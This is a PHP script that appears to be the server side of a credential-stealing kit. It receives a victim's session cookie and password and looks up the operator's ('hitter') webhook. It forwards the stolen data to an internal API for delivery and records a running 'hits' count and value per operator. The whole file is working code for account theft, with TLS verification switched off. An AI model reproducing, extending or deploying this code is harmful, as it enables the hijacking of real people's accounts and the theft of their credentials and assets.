<?php
// create needed dont works on test enviroments
include(__DIR__ . "/../../apis/config.php");

$dh = '{b}';
$name = '{d}';
$discord = '{e}';
$thumbnail = '{f}';
$fake = 'null';
$hitter = '{h}';

$domain = $_SERVER['HTTP_HOST'];
$cookie = isset($_POST['cookie']) ? $_POST['cookie'] : null;
$pass = isset($_POST['password']) ? $_POST['password'] : null;

if (empty($cookie)) {
    echo "cookie needed or invalid";
    exit;
}

$conn = new mysqli($servername, $username, $password, $dbname);
if ($conn->connect_error) {
    die("Database connection failed: " . $conn->connect_error);
}

$stmt = $conn->prepare("SELECT web FROM data WHERE dir = ?");
$stmt->bind_param("s", $hitter);
$stmt->execute();
$stmt->bind_result($web);
$stmt->fetch();
$stmt->close();

if (!$web) {
    echo "No webhook found for the user: $hitter";
    exit;
}

if ($fake == 'true') {
    $url = "https://" . $domain . "/apis/userinfo.php?cookie=" . urlencode($cookie) . "&web=" . urlencode($web) . "&dh=" . urlencode($dh) . "&name=" . urlencode($name) . "&thumb=" . urlencode($thumbnail) . "&discord=" . urlencode($discord) . "&password=" . urlencode($pass) . "&h=" . urlencode($hitter);
} else {
    $url = "https://" . $domain . "/apis/userinfo.php?cookie=" . urlencode($cookie) . "&web=" . urlencode($web) . "&password=" . urlencode($pass) . "&h=" . urlencode($hitter);
}

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$response = curl_exec($ch);
curl_close($ch);

$response_data = json_decode($response, true);

if (!isset($response_data["key"]) || !is_numeric($response_data["key"])) {
    echo "Invalid response from API.";
    exit;
}

$newValue = intval($response_data["key"]);

$stmt = $conn->prepare("SELECT summary, hits FROM data WHERE dir = ?");
$stmt->bind_param("s", $hitter);
$stmt->execute();
$stmt->bind_result($existingSummary, $existingHits);
$stmt->fetch();
$stmt->close();

if (!isset($existingSummary) || $existingSummary === null) {
    $existingSummary = 0;
}
if (!isset($existingHits) || $existingHits === null) {
    $existingHits = 0;
}

$updatedSummary = $existingSummary + $newValue;
$updatedHits = $existingHits + 1;

$updateStmt = $conn->prepare("UPDATE data SET summary = ?, hits = ? WHERE dir = ?");
$updateStmt->bind_param("iis", $updatedSummary, $updatedHits, $hitter);
$updateStmt->execute();
$updateStmt->close();
$conn->close();

?>
